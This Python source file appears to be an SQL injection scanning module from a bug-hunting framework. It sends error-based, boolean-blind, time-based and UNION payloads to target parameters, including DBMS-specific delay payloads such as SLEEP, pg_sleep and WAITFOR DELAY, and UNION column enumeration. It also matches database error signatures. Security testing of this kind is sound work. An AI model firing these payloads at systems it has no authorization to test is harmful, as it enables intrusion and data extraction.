"""
Specialized SQLi Hunter
Advanced SQL injection detection: error-based, blind, time-based, union, stacked
"""

import asyncio
import re
import random
from typing import List, Dict, Any, Optional
from dataclasses import dataclass

from core.config_manager import get_config
from hunting.scanner_orchestrator import VulnerabilityFinding, ScanTarget, ScannerType
from hunting.payload_manager import PayloadManager, PayloadContext


@dataclass
class SQLiContext:
    url: str
    parameter: str
    method: str
    injection_type: str  # error, blind, time, union, stacked
    dbms: str = "unknown"
    payload: str = ""
    technique: str = ""


class SQLiHunter:
    """Specialized SQL injection hunting module"""

    def __init__(self, config_manager):
        self.config = config_manager
        self.payload_manager = PayloadManager(config_manager)
        self.findings: List[VulnerabilityFinding] = []

        # Error patterns for different DBMS
        self.error_patterns = {
            "mysql": [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_.*",
                r"MySQLSyntaxErrorException",
                r"valid MySQL result",
                r"check the manual that corresponds to your MySQL server version",
                r"MySql\.Data\.MySqlClient\.MySqlException",
                r"com\.mysql\.jdbc",
                r"Zend_Db_Statement_Mysqli_Exception",
            ],
            "postgresql": [
                r"PostgreSQL.*ERROR",
                r"Warning.*\Wpg_.*",
                r"valid PostgreSQL result",
                r"Npgsql\.",
                r"PG::SyntaxError:",
                r"org\.postgresql\.util\.PSQLException",
                r"ERROR:\s+syntax error at or near",
                r"ERROR:\s+parser error",
            ],
            "mssql": [
                r"Driver.*SQL[\-\_\s]*Server",
                r"OLE DB.*SQL Server",
                r"Unclosed quotation mark after the character string",
                r"Microsoft OLE DB Provider for SQL Server",
                r"System\.Data\.SqlClient\.SqlException",
                r"System\.Data\.Odbc\.OdbcException",
                r"Microsoft SQL Native Client error",
            ],
            "oracle": [
                r"ORA-\d{5}",
                r"Oracle error",
                r"Oracle.*Driver",
                r"Warning.*\Woci_.*",
                r"Warning.*\Wora_.*",
            ],
            "sqlite": [
                r"SQLite/JDBCDriver",
                r"SQLite.Exception",
                r"System\.Data\.SQLite\.SQLiteException",
                r"sqlite3\.OperationalError",
            ],
        }

    async def hunt(self, targets: List[ScanTarget]) -> List[VulnerabilityFinding]:
        """Hunt for SQL injection vulnerabilities"""
        self.payload_manager.load_all()

        param_targets = [t for t in targets if t.parameters]

        for target in param_targets[:50]:
            for param_name, param_value in target.parameters.items():
                await self._test_parameter(target, param_name, param_value)

        return self.findings

    async def _test_parameter(self, target: ScanTarget, param_name: str, param_value: str):
        """Test a parameter for SQL injection"""
        # Test error-based
        await self._test_error_based(target, param_name)

        # Test blind boolean
        await self._test_blind_boolean(target, param_name)

        # Test time-based
        await self._test_time_based(target, param_name)

        # Test union
        await self._test_union(target, param_name)

    async def _test_error_based(self, target: ScanTarget, param_name: str):
        """Test error-based SQL injection"""
        payloads = self.payload_manager.get_payloads("sqli", PayloadContext.SQL_WHERE, limit=20)

        for payload_obj in payloads:
            payload = payload_obj.payload
            result = await self._send_payload_and_check_errors(target, param_name, payload, "error")

            if result:
                result.scanner = ScannerType.CUSTOM
                result.vuln_type = "sqli"
                result.severity = "P1"
                result.title = f"Error-based SQLi in {param_name} parameter"
                result.description = f"Error-based SQL injection in {param_name} parameter. Database: {result.evidence.get('dbms', 'unknown')}. Payload: {payload}"
                result.tags = ["sqli", "error-based", result.evidence.get('dbms', 'unknown')]
                self.findings.append(result)

    async def _test_blind_boolean(self, target: ScanTarget, param_name: str):
        """Test boolean-based blind SQL injection"""
        # Get baseline response
        baseline = await self._get_baseline_response(target, param_name)
        if not baseline:
            return

        # Test true condition
        true_payload = "' AND 1=1--"
        true_response = await self._send_payload(target, param_name, true_payload)

        # Test false condition
        false_payload = "' AND 1=2--"
        false_response = await self._send_payload(target, param_name, false_payload)

        # Compare responses
        if true_response and false_response:
            true_similar = self._compare_responses(baseline, true_response)
            false_similar = self._compare_responses(baseline, false_response)

            if true_similar > 0.9 and false_similar < 0.7:
                # Likely boolean-based SQLi
                finding = VulnerabilityFinding(
                    scanner=ScannerType.CUSTOM,
                    vuln_type="sqli",
                    severity="P2",
                    title=f"Boolean-based Blind SQLi in {param_name} parameter",
                    description=f"Boolean-based blind SQL injection in {param_name} parameter. True condition matches baseline, false condition differs.",
                    target=target,
                    evidence={
                        "technique": "boolean-blind",
                        "true_payload": true_payload,
                        "false_payload": false_payload,
                        "baseline_similarity": true_similar,
                        "false_similarity": false_similar,
                    },
                    poc="",
                    confidence=0.75,
                    tags=["sqli", "blind", "boolean"],
                )
                self.findings.append(finding)

    async def _test_time_based(self, target: ScanTarget, param_name: str):
        """Test time-based blind SQL injection"""
        # Get baseline timing
        baseline_time = await self._measure_response_time(target, param_name, "")
        if baseline_time is None:
            return

        # Test time delay payloads for different DBMS
        time_payloads = {
            "mysql": "' AND SLEEP(5)--",
            "postgresql": "' AND pg_sleep(5)--",
            "mssql": "'; WAITFOR DELAY '0:0:5'--",
            "oracle": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
            "sqlite": "' AND 1=randomblob(1000000000)--",
        }

        for dbms, payload in time_payloads.items():
            elapsed = await self._measure_response_time(target, param_name, payload)
            if elapsed and elapsed > baseline_time + 4:  # 5 second delay minus baseline
                finding = VulnerabilityFinding(
                    scanner=ScannerType.CUSTOM,
                    vuln_type="sqli",
                    severity="P2",
                    title=f"Time-based Blind SQLi in {param_name} parameter ({dbms})",
                    description=f"Time-based blind SQL injection in {param_name} parameter. Database: {dbms}. Delay: {elapsed:.2f}s",
                    target=target,
                    evidence={
                        "technique": "time-blind",
                        "dbms": dbms,
                        "payload": payload,
                        "baseline_time": baseline_time,
                        "injected_time": elapsed,
                    },
                    poc="",
                    confidence=0.8,
                    tags=["sqli", "blind", "time-based", dbms],
                )
                self.findings.append(finding)
                break  # Found one, no need to test others

    async def _test_union(self, target: ScanTarget, param_name: str):
        """Test UNION-based SQL injection"""
        # Determine number of columns
        num_columns = await self._find_column_count(target, param_name)
        if not num_columns:
            return

        # Build UNION payload
        nulls = ",".join(["NULL"] * num_columns)
        payload = f"' UNION SELECT {nulls}--"

        result = await self._send_payload_and_check_errors(target, param_name, payload, "union")

        if result:
            result.severity = "P1"
            result.title = f"UNION-based SQLi in {param_name} parameter ({num_columns} columns)"
            result.description = f"UNION-based SQL injection in {param_name} parameter with {num_columns} columns. Allows data extraction."
            result.evidence["technique"] = "union"
            result.evidence["column_count"] = num_columns
            result.tags = ["sqli", "union", str(num_columns)]
            self.findings.append(result)

    async def _find_column_count(self, target: ScanTarget, param_name: str) -> Optional[int]:
        """Find number of columns for UNION injection"""
        for i in range(1, 20):
            nulls = ",".join(["NULL"] * i)
            payload = f"' UNION SELECT {nulls}--"

            response = await self._send_payload(target, param_name, payload)
            if response and response.status_code == 200:
                # Check if error disappeared (success)
                if not self._has_sql_errors(response.text):
                    return i

        return None

    async def _send_payload_and_check_errors(self, target: ScanTarget, param_name: str,
                                              payload: str, technique: str) -> Optional[VulnerabilityFinding]:
        """Send payload and check for SQL errors"""
        response = await self._send_payload(target, param_name, payload)
        if not response:
            return None

        dbms = self._detect_dbms(response.text)
        if dbms:
            return VulnerabilityFinding(
                scanner=ScannerType.CUSTOM,
                vuln_type="sqli",
                severity="P1",
                title=f"{technique.capitalize()}-based SQLi in {param_name} parameter",
                description=f"",
                target=target,
                evidence={
                    "technique": technique,
                    "dbms": dbms,
                    "payload": payload,
                    "response_snippet": response.text[:500],
                },
                poc="",
                confidence=0.9,
                tags=["sqli", technique, dbms],
            )
        return None

    async def _send_payload(self, target: ScanTarget, param_name: str, payload: str) -> Optional[Any]:
        """Send HTTP request with payload"""
        import httpx

        if target.method == "GET":
            url = self._inject_parameter(target.url, param_name, payload)
            try:
                async with httpx.AsyncClient(timeout=15.0, follow_redirects=True) as client:
                    return await client.get(url)
            except Exception:
                return None
        else:
            # POST
            data = dict(target.parameters)
            data[param_name] = payload
            try:
                async with httpx.AsyncClient(timeout=15.0, follow_redirects=True) as client:
                    return await client.post(target.url, data=data)
            except Exception:
                return None

    def _inject_parameter(self, url: str, param_name: str, value: str) -> str:
        """Inject parameter into URL"""
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params[param_name] = [value]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    async def _get_baseline_response(self, target: ScanTarget, param_name: str):
        """Get baseline response for comparison"""
        return await self._send_payload(target, param_name, "")

    async def _measure_response_time(self, target: ScanTarget, param_name: str, payload: str) -> Optional[float]:
        """Measure response time"""
        import time
        import httpx

        url = self._inject_parameter(target.url, param_name, payload) if target.method == "GET" else target.url

        try:
            start = time.time()
            async with httpx.AsyncClient(timeout=30.0, follow_redirects=True) as client:
                if target.method == "GET":
                    await client.get(url)
                else:
                    data = dict(target.parameters)
                    data[param_name] = payload
                    await client.post(target.url, data=data)
            return time.time() - start
        except Exception:
            return None

    def _compare_responses(self, resp1: Any, resp2: Any) -> float:
        """Compare two responses similarity (0-1)"""
        if not resp1 or not resp2:
            return 0.0

        # Compare status codes
        if resp1.status_code != resp2.status_code:
            return 0.0

        # Compare content length
        len1 = len(resp1.text)
        len2 = len(resp2.text)
        if len1 == 0 or len2 == 0:
            return 0.0

        length_ratio = min(len1, len2) / max(len1, len2)

        # Compare content (simplified - could use difflib)
        # For now, use length ratio as proxy
        return length_ratio

    def _detect_dbms(self, response_text: str) -> Optional[str]:
        """Detect DBMS from error messages"""
        response_lower = response_text.lower()

        for dbms, patterns in self.error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return dbms

        return None

    def _has_sql_errors(self, text: str) -> bool:
        """Check if response has SQL errors"""
        return self._detect_dbms(text) is not None


# Convenience function
async def hunt_sqli(targets: List[ScanTarget], config_manager=None) -> List[VulnerabilityFinding]:
    """Hunt for SQL injection"""
    hunter = SQLiHunter(config_manager or get_config())
    return await hunter.hunt(targets)